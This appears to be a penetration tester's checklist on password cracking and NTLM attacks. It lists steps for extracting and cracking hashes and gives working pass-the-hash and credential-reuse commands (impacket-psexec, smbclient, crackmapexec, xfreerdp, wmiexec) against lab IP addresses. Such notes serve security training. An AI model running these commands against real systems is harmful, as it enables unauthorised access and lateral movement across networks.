# **Basics of Cracking Passwords**

- [ ] Extract hashes
    \- Retrieve from DBs, Files or accessing files (dir traversal), foothold, ect.
    
- [ ] Format hashes
    
- [ ] Calculate the cracking time
    
- [ ] Prepare wordlist
    \- Mutations
    
- [ ] Attack the hash
    
    ## NTLM -
    
- [ ] Obtain and crack NTLM hashes
    
- [ ] Pass NTLM hashes
    
- [ ] Obtain and crack Net-NTLMv2 hashes
    
- [ ] Relay Net-NTLMv2 hashes
    
- [ ] Use Hash
    
    ```

   	   kali@kali:~$ impacket-psexec -hashes 00000000000000000000000000000000:7a38310ea6f0027ee955abed1762964b Administrator@192.168.50.212`
    
   	   smbclient \\\\192.168.50.212\\secrets -U Administrator --pw-nt-hash 7a38310ea6f0027ee955abed1762964b
    
   	   crackmapexec smb 192.168.1.100 -u Administrator -p "Password123?" # Password
   	   crackmapexec smb 192.168.1.100 -u Administrator -H ":31d6cfe0d16ae931b73c59d7e0c089c0" # NT Hash
  	   export KRB5CCNAME=/tmp/kerberos/admin.ccache; crackmapexec smb 192.168.1.100 -u admin --use-kcache # Kerberos
    
	    xfreerdp  +compression +clipboard /dynamic-resolution +toggle-fullscreen /cert-ignore /bpp:8  /u:<Username> /pth:<NTLMHash> /v:<Hostname | IPAddress>

		wmiexec.py DOMAIN/username:password@10.10.10.10
		wmiexec.py DOMAIN/username@10.10.10.10 -hashes aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0

    ```
    
